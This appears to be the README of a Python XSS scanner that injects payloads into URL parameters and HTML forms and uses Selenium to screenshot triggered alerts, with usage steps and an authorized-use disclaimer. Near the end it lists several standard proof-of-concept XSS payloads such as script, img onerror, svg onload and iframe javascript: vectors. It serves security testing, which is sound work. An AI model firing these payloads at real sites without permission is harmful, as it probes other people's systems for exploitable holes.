
# 🔍 XSS Scanner - Automated Reflected and DOM XSS Tester

This is a powerful **XSS vulnerability scanner** written in Python. It automatically tests a given URL for reflected XSS vulnerabilities by injecting payloads into URL parameters and HTML forms. It also includes optional **headless browser-based screenshot capture** for visual confirmation of triggered payloads.

---

## 🧪 Features

- ✅ Tests for reflected, DOM-based, and form-based XSS
- 🚀 Automatically injects known bypass payloads
- 📷 Takes screenshots of triggered payloads using Selenium
- 🧠 Parses and analyzes input forms
- 📄 Saves detected vulnerable URLs and data
- 💡 Includes classic and modern payloads (e.g. `<svg>`, `<details>`, `data:` URIs)

---

## 📦 Requirements

Install the dependencies with:

```bash
pip install -r requirements.txt
````

Or install manually:

```bash
pip install requests beautifulsoup4 selenium urllib3
```

Also make sure you have **Google Chrome** and **ChromeDriver** installed and available in your system path.

---

## 🚀 Usage

```bash
python test.py <url>
```

### Example:

```bash
python test.py "http://localhost:3000/?name=guest"
```

---

## 🧠 How It Works

* **URL Parameter Injection**: Modifies each query parameter with dozens of XSS payloads and checks responses for reflection.
* **Form Input Scanning**: Finds all `<form>` elements and injects XSS payloads into all input fields.
* **Screenshot Capture**: Uses Selenium to visually confirm and capture screenshots of triggered alerts (`screenshoot/` folder).

---

## 📁 Output

* Detected vulnerabilities are printed to the terminal.
* Screenshots are saved in the `screenshoot/` directory with filename based on URL.
* All tested/reflected links can optionally be saved to `links.txt`.

---

## 💥 Payload Examples Used

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe src=javascript:alert(1)>
<input autofocus onfocus=alert(1)>
```

Both raw and encoded payloads are tested.

---

## ⚠️ Disclaimer

This script is meant for **educational and authorized security testing only**. Never use it on systems without **explicit permission**.

---

## 📜 License

MIT License – Use responsibly and ethically.

